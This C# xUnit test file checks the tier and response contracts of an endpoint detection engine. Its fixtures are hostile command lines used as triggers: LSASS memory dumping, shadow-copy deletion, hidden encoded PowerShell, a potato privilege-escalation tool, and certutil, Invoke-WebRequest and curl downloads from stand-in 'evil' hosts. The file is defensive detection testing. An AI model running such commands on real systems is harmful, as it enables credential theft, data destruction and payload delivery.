using System;
using System.IO;
using System.Collections.Generic;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging.Abstractions;
using Xunit;
using Sentinel.Core;

namespace Sentinel.Tests
{
    /// <summary>
    /// v1.6.5 Test Hardening - Verifies detection contract invariants
    /// that must hold across all future versions.
    /// </summary>
    public class V165TestHardeningTests
    {
        private static FusedTelemetryContext MakeContext(TelemetryEvent te) =>
            new() { ProcessId = te.ProcessId, ProcessName = te.ProcessName, TriggeringEvent = te };

        #region Tier Contract Enforcement

        [Fact]
        public void AllTier1Rules_MustHaveKillOrHigherResponse()
        {
            var rules = new IDetectionRule[]
            {
                new LsassAccessRule(),
                new RansomwareDetectionRule(),
                new ReverseShellRule(),
                new ThreatIntelInjectionRule(),
                new PrivilegeEscalationRule(),
                new AttackToolsRule(),
                new ClickFixDetectionRule(),
                new NpmSupplyChainRule(),
                new ChromeRemoteDebuggingRule(),
                new DllSideloadingDetectionRule()
            };

            // Each rule must either return null or a Tier1 with kill-authorized response
            var tier1Triggers = new Dictionary<IDetectionRule, TelemetryEvent>
            {
                [rules[0]] = new ProcessTelemetry { ProcessName = "x", ProcessId = 1, CommandLine = "procdump lsass minidump", ImagePath = @"C:\x" },
                [rules[1]] = new ProcessTelemetry { ProcessName = "x", ProcessId = 2, CommandLine = "vssadmin delete shadows /all", ImagePath = @"C:\x" },
                [rules[2]] = new ProcessTelemetry { ProcessName = "powershell.exe", ProcessId = 3, CommandLine = "powershell.exe -enc ABC -w hidden -nop", ImagePath = @"C:\x" },
                [rules[3]] = new ThreatIntelTelemetry { ProcessName = "mal.exe", ProcessId = 4, ApiName = "VirtualAllocEx", TargetProcessId = 99 },
                [rules[4]] = new ProcessTelemetry { ProcessName = "x", ProcessId = 5, CommandLine = "godpotato.exe -cmd cmd", ImagePath = @"C:\x", ParentProcessName = "cmd" },
                [rules[5]] = new ProcessTelemetry { ProcessName = "x", ProcessId = 6, CommandLine = "certutil -urlcache -f http://evil", ImagePath = @"C:\x" },
                [rules[6]] = new ProcessTelemetry { ProcessName = "powershell.exe", ProcessId = 7, CommandLine = "powershell.exe Invoke-WebRequest http://evil", ImagePath = @"C:\x", ParentProcessName = "explorer.exe" },
                [rules[7]] = new ProcessTelemetry { ProcessName = "cmd.exe", ProcessId = 8, CommandLine = "cmd /c curl https://evil.com/dl", ImagePath = @"C:\x", ParentProcessName = "npm.exe" },
                [rules[8]] = new ProcessTelemetry { ProcessName = "chrome.exe", ProcessId = 9, CommandLine = "chrome.exe --remote-debugging-port=9222", ImagePath = @"C:\x", ParentProcessName = "malware.exe" },
                [rules[9]] = new ProcessTelemetry { ProcessName = "cmd.exe", ProcessId = 10, CommandLine = "cmd.exe", ImagePath = @"C:\Users\Admin\Temp\cmd.exe" },
            };

            foreach (var (rule, trigger) in tier1Triggers)
            {
                var result = rule.Evaluate(MakeContext(trigger));
                if (result != null && result.Tier == DetectionTier.Tier1Behavioral)
                {
                    Assert.True(result.AuthorizedResponse >= ResponseAction.KillProcess,
                        $"Rule {rule.Name} fired Tier1 but response {result.AuthorizedResponse} is below KillProcess");
                }
            }
        }

        #endregion

        #region Tier2 Rules Must NEVER Have Kill Response

        [Fact]
        public void Tier2Detections_MustNeverKill()
        {
            var unsignedRule = new UnsignedBinaryRule();
            var campaignRule = new CampaignIocRule();

            // UnsignedBinaryRule should be Tier2
            var result1 = unsignedRule.Evaluate(MakeContext(new ProcessTelemetry
            {
                ProcessName = "x.exe", ProcessId = 1,
                ImagePath = @"C:\Users\Admin\Downloads\x.exe", CommandLine = "x.exe"
            }));
            if (result1 != null && result1.Tier == DetectionTier.Tier2Indicator)
            {
                Assert.Equal(ResponseAction.LogOnly, result1.AuthorizedResponse);
            }

            // CampaignIocRule filename match should be Tier2
            var result2 = campaignRule.Evaluate(MakeContext(new ProcessTelemetry
            {
                ProcessName = "svchosts.exe", ProcessId = 2,
                ImagePath = @"C:\Temp\svchosts.exe", CommandLine = "svchosts.exe"
            }));
            if (result2 != null && result2.Tier == DetectionTier.Tier2Indicator)
            {
                Assert.True(result2.AuthorizedResponse <= ResponseAction.NetworkIsolate,
                    "Tier2 detection must never have KillProcess or higher response");
            }
        }

        #endregion

        #region Signal Type Correctness

        [Fact]
        public void LsassRule_SignalType_IsLsassAccess()
        {
            var rule = new LsassAccessRule();
            var result = rule.Evaluate(MakeContext(new ProcessTelemetry
            {
                ProcessName = "x", ProcessId = 1,
                CommandLine = "dumptool lsass minidump", ImagePath = @"C:\x"
            }));
            Assert.NotNull(result);
            Assert.Equal(SignalType.LsassAccess, result!.SignalType);
        }

        [Fact]
        public void RansomwareRule_SignalType_IsRansomware()
        {
            var rule = new RansomwareDetectionRule();
            var result = rule.Evaluate(MakeContext(new ProcessTelemetry
            {
                ProcessName = "x", ProcessId = 1,
                CommandLine = "vssadmin delete shadows", ImagePath = @"C:\x"
            }));
            Assert.NotNull(result);
            Assert.Equal(SignalType.Ransomware, result!.SignalType);
        }

        [Fact]
        public void InjectionRule_SignalType_IsProcessInjection()
        {
            var rule = new ThreatIntelInjectionRule();
            var result = rule.Evaluate(MakeContext(new ThreatIntelTelemetry
            {
                ProcessName = "x", ProcessId = 1,
                ApiName = "CreateRemoteThread", TargetProcessId = 2
            }));
            Assert.NotNull(result);
            Assert.Equal(SignalType.ProcessInjection, result!.SignalType);
        }

        #endregion

        #region Detection Deduplication Contract

        [Fact]
        public void DetectionEvent_HasTimestamp()
        {
            var before = DateTime.UtcNow;
            var ev = new DetectionEvent { RuleName = "Test", ProcessId = 1 };
            var after = DateTime.UtcNow;
            Assert.True(ev.Timestamp >= before);
            Assert.True(ev.Timestamp <= after);
        }

        [Fact]
        public void DetectionEvent_Metadata_NeverNull()
        {
            var ev = new DetectionEvent();
            Assert.NotNull(ev.Metadata);
        }

        #endregion

        #region President's Law Cannot Be Bypassed

        [Fact]
        public void PresidentsLaw_C2Beaconing_IsProtected()
        {
            // v1.5.9: C2 Beaconing re-added to President's Law
            Assert.True(ScoringEngine.IsPresidentsLawRule("C2 Beaconing Behavior"));
        }

        [Theory]
        [InlineData("LsassAccessRule")]
        [InlineData("RansomwareDetectionRule")]
        [InlineData("ThreatIntelInjectionRule")]
        [InlineData("ReverseShellRule")]
        [InlineData("PrivilegeEscalationRule")]
        public void PresidentsLaw_CoreRules_AreClassifiedCorrectly(string ruleName)
        {
            Assert.True(ScoringEngine.IsPresidentsLawRule(ruleName));
        }

        #endregion

        #region OS-Critical Path Protection (v1.6.3)

        [Theory]
        [InlineData(@"C:\Windows\System32\cmd.exe")]
        [InlineData(@"C:\Windows\System32\powershell.exe")]
        [InlineData(@"C:\Windows\System32\svchost.exe")]
        [InlineData(@"C:\Program Files\Windows Defender\MsMpEng.exe")]
        public void CriticalPaths_AreProtected(string path)
        {
            // Verify that OS-critical paths are recognized as such
            var lower = path.ToLowerInvariant();
            bool isSystemRoot = lower.Contains(@"\windows\system32") || 
                                lower.Contains(@"\windows defender");
            Assert.True(isSystemRoot, $"Path should be recognized as OS-critical: {path}");
        }

        #endregion
    }
}
